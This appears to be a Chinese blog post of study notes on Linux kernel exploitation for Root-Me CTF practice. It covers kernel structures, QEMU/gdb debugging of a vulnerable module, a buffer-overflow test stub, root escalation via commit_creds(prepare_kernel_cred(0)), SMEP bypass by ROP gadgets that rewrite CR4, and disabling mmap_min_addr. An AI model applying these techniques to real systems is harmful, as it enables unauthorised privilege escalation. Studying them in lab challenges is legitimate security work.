<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">void</span>* eip;                <span class="comment">// instruction pointer +0</span></span><br><span class="line">    <span class="keyword">uint32_t</span> cs;              <span class="comment">// code segment   	 +4</span></span><br><span class="line">    <span class="keyword">uint32_t</span> eflags;          <span class="comment">// CPU flags     		 +8</span></span><br><span class="line">    <span class="keyword">void</span>* esp;                <span class="comment">// stack pointer       +12</span></span><br><span class="line">    <span class="keyword">uint32_t</span> ss;              <span class="comment">// stack segment  	 +16</span></span><br><span class="line">&#125; __attribute__((packed));</span><br></pre></td></tr></table></figure>
<h3 id="thread-info"><a href="#thread-info" class="headerlink" title="thread_info"></a>thread_info</h3><p>内核堆栈与thread_info结构共享4k / 8k的总大小</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">union</span> thread_union &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread_info</span> <span class="title">thread_info</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="built_in">stack</span>[THREAD_SIZE/<span class="keyword">sizeof</span>(<span class="keyword">long</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/2020-03-15-061423.png" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
<h4 id="restart-block"><a href="#restart-block" class="headerlink" title="restart_block"></a>restart_block</h4><ol>
<li>thread_info中的一个成员</li>
<li>是每个线程的结构</li>
<li>跟踪信息和参数 =&gt; 重新启动系统调用</li>
</ol>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> &#123;</span></span><br><span class="line">    <span class="keyword">long</span> (*fn)(struct restart_block *);</span><br></pre></td></tr></table></figure>
<p>有一个fn的函数指针，控制该指针 =&gt; 劫持EIP</p>
<h5 id="调用fn"><a href="#调用fn" class="headerlink" title="调用fn"></a>调用fn</h5><p>用户态调用fn</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE0(restart_syscall)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">restart_block</span> *<span class="title">restart</span> = &amp;<span class="title">current_thread_info</span>()-&gt;<span class="title">restart_block</span>;</span></span><br><span class="line">    <span class="keyword">return</span> restart-&gt;fn(restart);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">syscall(SYS_restart_syscall);</span><br></pre></td></tr></table></figure>
<h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">mmap</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> length, <span class="keyword">int</span> prot, <span class="keyword">int</span> flags,<span class="keyword">int</span> fd, <span class="keyword">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure>
<ol>
<li><p>返回值：成功返回创建的映射区的首地址；失败返回<strong>宏MAP_FAILED。</strong></p>
</li>
<li><p>参数： </p>
<p>addr:    指向欲映射的内存起始地址，通常设为 NULL，代表让系统自动选定地址，映射成功后返回该地址。</p>
<p>length： 欲创建映射区的大小。</p>
<p>prot：   映射区权限PROT_READ、PROT_WRITE、PROT_READ|PROT_WRITE。</p>
<p>flags：   标志位参数(常用于设定更新物理区域、设置共享、创建匿名映射区)；</p>
<p>MAP_SHARED: 会将映射区所做的操作反映到物理设备（磁盘）上。</p>
<p>MAP_PRIVATE: 映射区所做的修改不会反映到物理设备。</p>
<p>fd：     用来建立映射区的文件描述符。</p>
<p>offset： 映射文件的偏移(4k的整数倍)。</p>
</li>
</ol>
<h3 id="memcpy"><a href="#memcpy" class="headerlink" title="memcpy"></a>memcpy</h3><blockquote>
<p>从源source所指的内存地址的起始位置开始拷贝n个字节到目标<strong>destin</strong>所指的内存地址的起始位置中。</p>
</blockquote>
<h4 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">memcpy</span><span class="params">(<span class="keyword">void</span> destin, <span class="keyword">void</span> source, <span class="keyword">unsigned</span> n)</span></span>;</span><br></pre></td></tr></table></figure>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><ul>
<li>destin— 指向用于存储复制内容的目标数组，类型强制转换为 void* 指针。</li>
<li>source— 指向要复制的数据源，类型强制转换为 void* 指针。</li>
<li>n— 要被复制的字节数。</li>
</ul>
<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>该函数返回一个指向目标存储区destin的指针。</p>
<h3 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h3><div class="table-container">
<table>
<thead>
<tr>
<th>kptr_restrict</th>
<th>权限描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>2</td>
<td>内核将符号地址打印为全0, root和普通用户都没有权限</td>
</tr>
<tr>
<td>1</td>
<td>root用户有权限读取, 普通用户没有权限</td>
</tr>
<tr>
<td>0</td>
<td>root和普通用户都可以读取</td>
</tr>
</tbody>
</table>
</div>
<h3 id="tty"><a href="#tty" class="headerlink" title="tty"></a>tty</h3><p><a href="https://blog.csdn.net/zhoucheng05_13/article/details/86510469" target="_blank" rel="noopener">https://blog.csdn.net/zhoucheng05_13/article/details/86510469</a></p>
<ol>
<li>虚拟控制台</li>
<li>串口</li>
<li>伪终端设备</li>
</ol>
<h3 id="ptmx"><a href="#ptmx" class="headerlink" title="ptmx"></a>ptmx</h3><p>伪终端的master端</p>
<h3 id="kmalloc"><a href="#kmalloc" class="headerlink" title="kmalloc"></a>kmalloc</h3><p>使用<code>slab/slub</code>分配器，使用多级的结构进行管理</p>
<p>首先有<code>cache</code>层</p>
<h4 id="cache结构"><a href="#cache结构" class="headerlink" title="cache结构"></a><code>cache</code>结构</h4><ol>
<li>空对象</li>
<li>部分使用的对象</li>
<li>完全使用中的对象</li>
</ol>
<p>对象就是指内存对象，也就是用来分配或者已经分配的一部分内核空间。</p>
<h3 id="slab-slub分配器"><a href="#slab-slub分配器" class="headerlink" title="slab/slub分配器"></a><code>slab/slub</code>分配器</h3><ul>
<li><p><code>slab</code>分配器严格按照<code>cache</code>去区分，不同<code>cache</code>的无法分配在一页内</p>
</li>
<li><p><code>slub</code>分配器则较为宽松，不同<code>cache</code>如果分配相同大小，可能会在一页内。</p>
</li>
</ul>
<h3 id="mount"><a href="#mount" class="headerlink" title="mount"></a>mount</h3><p>mount是Linux下的一个命令，它可以将分区挂接到Linux的一个文件夹下，从而将分区和该目录联系起来，因此我们只要访问这个文件夹，就相当于访问该分区了。</p>
<h3 id="file-operations"><a href="#file-operations" class="headerlink" title="file_operations"></a>file_operations</h3><p>属于Linux 字符设备驱动结构</p>
<ol>
<li>Linux使用file_operations结构访问驱动程序的函数，这个结构的每一个成员的名字都对应着一个调用。</li>
<li>用户进程利用在对设备文件进行诸如read/write操作的时候，系统调用通过设备文件的主设备号找到相应的设备驱动程序，然后读取这个数据结构相应的函数指针，接着把控制权交给该函数，这是Linux的设备驱动程序工作的基本原理。</li>
</ol>
<h4 id="read函数"><a href="#read函数" class="headerlink" title="read函数"></a>read函数</h4><blockquote>
<p>这个函数用来从<strong>设备</strong>中<strong>获取数据</strong>。</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> (*<span class="built_in">read</span>) (struct file * filp, <span class="keyword">char</span> __user * <span class="built_in">buffer</span>, <span class="keyword">size_t</span>    <span class="built_in">size</span> , <span class="keyword">loff_t</span> * p);</span><br></pre></td></tr></table></figure>
<ul>
<li>指针参数 filp 为进行读取信息的目标文件</li>
<li>指针参数buffer 为对应放置信息的缓冲区（即用户空间内存地址）</li>
<li>参数size为要读取的信息长度</li>
<li>参数 p 为读的位置相对于文件开头的偏移，在读取信息后，这个指针一般都会移动，移动的值为要读取信息的长度值</li>
</ul>
<h4 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h4><blockquote>
<p> 发送数据给设备</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> (*<span class="built_in">write</span>) (struct file * filp, <span class="keyword">const</span> <span class="keyword">char</span> __user *   <span class="built_in">buffer</span>, <span class="keyword">size_t</span> count, <span class="keyword">loff_t</span> * ppos);</span><br></pre></td></tr></table></figure>
<ul>
<li>参数filp为目标文件结构体指针</li>
<li>buffer为要写入文件的信息缓冲区</li>
<li>count为要写入信息的长度</li>
<li>ppos为当前的偏移位置，这个值通常是用来判断写文件是否越界</li>
</ul>
<h3 id="内核态函数调用"><a href="#内核态函数调用" class="headerlink" title="内核态函数调用"></a>内核态函数调用</h3><p>memcpy() =&gt; copy_from_user()/copy_to_user()</p>
<blockquote>
<p>都是将rsi的数据拷贝到rdi</p>
</blockquote>
<ul>
<li><p>copy_from_user()</p>
<ul>
<li><p>原型：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">copy_from_user(<span class="keyword">void</span> *to, <span class="keyword">const</span> <span class="keyword">void</span> __user *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> n)</span><br></pre></td></tr></table></figure>
<p>@to     将数据拷贝到内核的地址</p>
<p>@from  需要拷贝数据的地址</p>
</li>
<li><p>从用户空间拷贝数据到内核空间</p>
</li>
<li><p>返回值</p>
<ul>
<li>失败返回没有被拷贝的字节数</li>
<li>成功返回0</li>
</ul>
</li>
</ul>
</li>
<li><p>copy_to_user()</p>
</li>
</ul>
<h3 id="cred-结构体"><a href="#cred-结构体" class="headerlink" title="cred 结构体"></a>cred 结构体</h3><p><a href="https://code.woboq.org/linux/linux/include/linux/cred.h.html#cred" target="_blank" rel="noopener">源码</a></p>
<ul>
<li>内核使用<code>cred</code>结构体记录进程的权限(<code>uid，gid</code>等）</li>
<li>每个进程中都有一个 cred 结构</li>
<li>如果能修改某个进程的<code>cred</code>，那么也就修改了这个进程的权限。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The security context of a task</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The parts of the context break down into two categories:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (1) The objective context of a task.  These parts are used when some other</span></span><br><span class="line"><span class="comment"> *	task is attempting to affect this one.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  (2) The subjective context.  These details are used when the task is acting</span></span><br><span class="line"><span class="comment"> *	upon another object, be that a file, a task, a key or whatever.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that some members of this structure belong to both categories - the</span></span><br><span class="line"><span class="comment"> * LSM security pointer for instance.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * A task has two security pointers.  task-&gt;real_cred points to the objective</span></span><br><span class="line"><span class="comment"> * context that defines that task's actual details.  The objective part of this</span></span><br><span class="line"><span class="comment"> * context is used whenever that task is acted upon.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * task-&gt;cred points to the subjective context that defines the details of how</span></span><br><span class="line"><span class="comment"> * that task is going to act upon another object.  This may be overridden</span></span><br><span class="line"><span class="comment"> * temporarily to point to another security context, but normally points to the</span></span><br><span class="line"><span class="comment"> * same context as task-&gt;real_cred.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">	<span class="keyword">atomic_t</span>	subscribers;	<span class="comment">/* number of processes subscribed */</span></span><br><span class="line">	<span class="keyword">void</span>		*put_addr;</span><br><span class="line">	<span class="keyword">unsigned</span>	magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC	0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD	0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="keyword">kuid_t</span>		uid;		<span class="comment">/* real UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		gid;		<span class="comment">/* real GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		suid;		<span class="comment">/* saved UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		sgid;		<span class="comment">/* saved GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		euid;		<span class="comment">/* effective UID of the task */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		egid;		<span class="comment">/* effective GID of the task */</span></span><br><span class="line">	<span class="keyword">kuid_t</span>		fsuid;		<span class="comment">/* UID for VFS ops */</span></span><br><span class="line">	<span class="keyword">kgid_t</span>		fsgid;		<span class="comment">/* GID for VFS ops */</span></span><br><span class="line">	<span class="keyword">unsigned</span>	securebits;	<span class="comment">/* SUID-less security management */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_inheritable; <span class="comment">/* caps our children can inherit */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_permitted;	<span class="comment">/* caps we're permitted */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_effective;	<span class="comment">/* caps we can actually use */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_bset;	<span class="comment">/* capability bounding set */</span></span><br><span class="line">	<span class="keyword">kernel_cap_t</span>	cap_ambient;	<span class="comment">/* Ambient capability set */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	jit_keyring;	<span class="comment">/* default keyring to attach requested</span></span><br><span class="line"><span class="comment">					 * keys to */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span> __<span class="title">rcu</span> *<span class="title">session_keyring</span>;</span> <span class="comment">/* keyring inherited over fork */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">process_keyring</span>;</span> <span class="comment">/* keyring private to this process */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">thread_keyring</span>;</span> <span class="comment">/* keyring private to this thread */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">key</span>	*<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>		*security;	<span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>	<span class="comment">/* real user ID subscription */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>	<span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span>	<span class="title">rcu</span>;</span>		<span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure>
<h3 id="fork"><a href="#fork" class="headerlink" title="fork"></a>fork</h3><p>将运行着的程序分成2个（几乎）完全一样的进程，每个进程都启动一个从代码的同一位置开始执行的线程。</p>
<p>返回值：</p>
<ul>
<li>负值：创建子进程失败。</li>
<li>零：返回到新创建的子进程。</li>
<li>正值：返回父进程或调用者。该值包含新创建的子进程的进程ID 。</li>
</ul>
<h2 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h2><h3 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h3><blockquote>
<p>可以创建一个<code>start.sh</code>文件，拷贝下面的内容，其中需要修改path路径为存放文件的路径。</p>
<p>也可以直接在命令行执行</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -kernel bzImage -s -append nokaslr -initrd initramfs.img -fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;linkern  -device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">qemu-system-i386 -s \</span><br><span class="line">-kernel bzImage \</span><br><span class="line">-append nokaslr \</span><br><span class="line">-initrd initramfs.img \</span><br><span class="line">-fsdev local,security_model&#x3D;passthrough,id&#x3D;fsdev-fs0,path&#x3D;&#x2F;home&#x2F;winter&#x2F;nullpoint&#x2F; \</span><br><span class="line">-device virtio-9p-pci,id&#x3D;fs0,fsdev&#x3D;fsdev-fs0,mount_tag&#x3D;rootme</span><br></pre></td></tr></table></figure>
<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><blockquote>
<p>调试方法</p>
</blockquote>
<p>调试x64内核=&gt;设置架构=&gt;set architecture i386:x86-64:intel</p>
<h4 id="第一部分：c文件"><a href="#第一部分：c文件" class="headerlink" title="第一部分：c文件"></a>第一部分：c文件</h4><ol>
<li><p>编写一个c程序，如下</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Padding[<span class="number">9</span>] = <span class="string">"AAAAAAAA"</span>;</span><br><span class="line">    <span class="keyword">char</span> Eip[<span class="number">5</span>] ;</span><br><span class="line">    <span class="keyword">int</span> fd = <span class="built_in">open</span>(<span class="string">"/dev/tostring"</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">0x40</span>; i++)</span><br><span class="line">        <span class="built_in">write</span>(fd,Padding,<span class="keyword">sizeof</span>(Padding));</span><br><span class="line">    <span class="built_in">write</span>(fd,Eip,<span class="keyword">sizeof</span>(Eip));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>编译为静态文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">g++ -m32 -static -o <span class="built_in">test</span> test.cpp</span><br></pre></td></tr></table></figure>
</li>
<li><p>解压文件系统</p>
<blockquote>
<p><a href="https://www.cnblogs.com/carriezhangyan/p/9407567.html" target="_blank" rel="noopener">https://www.cnblogs.com/carriezhangyan/p/9407567.html</a></p>
<p>可以将下面的放在一个first.sh脚本中执行</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">mv initramfs.img initramfs.img.gz</span><br><span class="line">gunzip initramfs.img.gz</span><br><span class="line">mkdir initramfs</span><br><span class="line"><span class="built_in">cd</span> initramfs</span><br><span class="line">cpio -idvm &lt; ../initramfs.img</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210531143052634.png" alt="image-20210531143052634"></p>
</li>
<li><p>将编译好的文件放入文件夹</p>
<p><img src="/2021/06/05/20-29/image-20210531143128795.png" alt="image-20210531143128795"></p>
</li>
<li><p>打包文件系统</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行start.sh，此时qemu里面可以看到test文件</p>
<p><img src="/2021/06/05/20-29/image-20210531143323513.png" alt="image-20210531143323513"></p>
</li>
</ol>
<blockquote>
<p>以上步骤整合成一个自动打包c文件并启动的脚本</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">gcc -m32 -static -o exp exp.c</span><br><span class="line">cp exp.c initramfs</span><br><span class="line">cp exp initramfs</span><br><span class="line">cd initramfs</span><br><span class="line">find . | cpio -H newc -o &gt; ../initramfs.img</span><br><span class="line">cd ..</span><br><span class="line">./start.sh</span><br></pre></td></tr></table></figure>
<h4 id="第二部分：vmlinux"><a href="#第二部分：vmlinux" class="headerlink" title="第二部分：vmlinux"></a>第二部分：vmlinux</h4><ul>
<li>bzImage：理解为压缩后的kernel文件</li>
<li>vmlinux：静态编译、未经过压缩</li>
</ul>
<p>若程序没有给vmlinux，给了bzImage，可以自行提取</p>
<p>在<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">网站</a>拷贝代码，命名为extract-vmlinux文件</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./extract-vmlinux ./bzImage &gt; vmlinux</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">winter@ubuntu:~/linkern$ file vmlinux </span><br><span class="line">vmlinux: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, BuildID[sha1]=c5ad14eb97bda6a8093fa59483ca5ad055d69638, stripped</span><br></pre></td></tr></table></figure>
<h4 id="第三部分：查找LKMs模块基址"><a href="#第三部分：查找LKMs模块基址" class="headerlink" title="第三部分：查找LKMs模块基址"></a>第三部分：查找LKMs模块基址</h4><p>1.查找模块名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsmod</span><br><span class="line">#查看所有模块，模块名为basic1_ch1，得到基址.text基址：0xc8824000</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210531150406602.png" alt="image-20210531150406602"></p>
<p>2.进入节区文件夹，访问<code>.text</code>、<code>.bss</code>、<code>.data</code></p>
<p>路径：<code>/sys/module/[模块名]/sections</code></p>
<p><img src="/2021/06/05/20-29/image-20210531150708860.png" alt="image-20210531150708860"></p>
<h4 id="第四部分：gdb"><a href="#第四部分：gdb" class="headerlink" title="第四部分：gdb"></a>第四部分：gdb</h4> <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">gdb vmlinux</span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">add-symbol-file lkms .text地址 (-s .bss .bss地址 -s .data .data地址)</span><br><span class="line">add-symbol-file ./initramfs/lib/modules/4.10.3/rootme/tostring.ko 0xc8824000 -s .bss 0xc8824600 -s .data 0xc8824360</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">target remote:1234	[启动文件里面-s默认端口是1234](指定端口:-gdb tcp::4869 )</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210531151735100.png" alt="image-20210531151735100"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#下断点，一般下在write、read上面</span><br><span class="line">b tostring_write</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210531151809409.png" alt="image-20210531151809409"></p>
<h4 id="第五部分：执行qemu里的c程序"><a href="#第五部分：执行qemu里的c程序" class="headerlink" title="第五部分：执行qemu里的c程序"></a>第五部分：执行qemu里的c程序</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;test</span><br><span class="line">#程序讲断在write函数上</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210531151832106.png" alt="image-20210531151832106"></p>
<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>kernel 中有两个可以方便的改变权限的函数：</p>
<ul>
<li>int commit_creds(struct cred *new)</li>
<li>struct cred* prepare_kernel_cred(struct task_struct* daemon)</li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><blockquote>
<p>root权限下，执行以下命令</p>
</blockquote>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">grep commit_creds /proc/kallsyms </span><br><span class="line">grep prepare_kernel_cred /proc/kallsyms</span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210602220742358.png" alt="image-20210602220742358"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void* (*prepare_kernel_cred)(void*) KERNCALL &#x3D; (void*) 0xC10711F0;</span><br><span class="line">void* (*commit_creds)(void*) KERNCALL &#x3D; (void*) 0xC1070E80;</span><br></pre></td></tr></table></figure>
<h4 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h4><ol>
<li>执行下面函数，从而将权限提升为root</li>
</ol>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">commit_creds(prepare_kernel_cred(<span class="number">0</span>))</span><br></pre></td></tr></table></figure>
<ol>
<li>iret返回到用户模式</li>
</ol>
<h3 id="Bypass-SMEP"><a href="#Bypass-SMEP" class="headerlink" title="Bypass SMEP"></a>Bypass SMEP</h3><h4 id="绕过来由"><a href="#绕过来由" class="headerlink" title="绕过来由"></a>绕过来由</h4><p>smep是不允许处于内核态的时候执行用户态代码。</p>
<ul>
<li>之前如果没有开启smep，一般在提权成功后，在切换内核栈和用户栈时候，设置里面的寄存器值，使eip执行system(‘/bin/sh’)</li>
<li>如果开启了smep，则不允许这么做了，故想办法绕过smep，这样就能和之前一样的做法</li>
</ul>
<h4 id="smep原理"><a href="#smep原理" class="headerlink" title="smep原理"></a>smep原理</h4><p>内核是根据<code>CR4</code>寄存器的值来判断<code>smep</code>保护是否开启的</p>
<pre><code>* 当`CR4`寄存器的第`20`位是`1`时，保护开启
* 是`0`时，保护关闭。
</code></pre><p>以下是<code>CR4</code>寄存器的各标志位：</p>
<p><img src="/2021/06/05/20-29/2020-03-18-072543.jpg" alt="Click to close image, click and drag to move. Use arrow keys for next and previous."></p>
<p>因此，如果在内核中存在<code>gadget</code>能让我们修改<code>CR4</code>寄存器的值我们就可以手动来关闭<code>SMEP</code>保护了。</p>
<h4 id="基本方法"><a href="#基本方法" class="headerlink" title="基本方法"></a>基本方法</h4><ol>
<li><p>首先将bzImage解压出vmlinux</p>
</li>
<li><p>由于文件很大，gadget很多，故将gadget导入到一个文件中</p>
<p><code>ROPgadget --binary ./vmlinux &gt; gadgets</code></p>
</li>
<li><p>在文件中寻找可以控制cr4寄存器的gadget，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xc10174fc : pop eax ; ret</span><br><span class="line">0xc1045053 : mov cr4, eax ; pop ebp ; ret</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="trick"><a href="#trick" class="headerlink" title="trick"></a>trick</h3><h4 id="1-mmap-min-addr"><a href="#1-mmap-min-addr" class="headerlink" title="1.mmap_min_addr"></a>1.mmap_min_addr</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/vm/mmap_min_addr</span><br></pre></td></tr></table></figure>
<p>解除了<code>mmap_min_addr</code>保护</p>
<p>因为最低可以映射到0，哪里都可以映射，相当于没限制了</p>
<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="1-Root-Me-LinKern-x86-–-Buffer-overflow-basic-1"><a href="#1-Root-Me-LinKern-x86-–-Buffer-overflow-basic-1" class="headerlink" title="1.[Root-Me]LinKern x86 – Buffer overflow basic 1"></a>1.[Root-Me]LinKern x86 – Buffer overflow basic 1</h3><h4 id="下载文件"><a href="#下载文件" class="headerlink" title="下载文件"></a>下载文件</h4><p><a href="https://www.root-me.org/en/Challenges/App-System/LinKern-x86-Buffer-overflow-basic-1" target="_blank" rel="noopener">下载地址</a></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ssh -p 2223 app-systeme-ch1@challenge03.root-me.org</span><br><span class="line"><span class="meta">#</span><span class="bash">password:app-systeme-ch1</span></span><br></pre></td></tr></table></figure>
<p><img src="/2021/06/05/20-29/image-20210603142323422.png" alt="image-20210603142323422"></p>
<p>利用scp将文件拷贝倒本地</p>
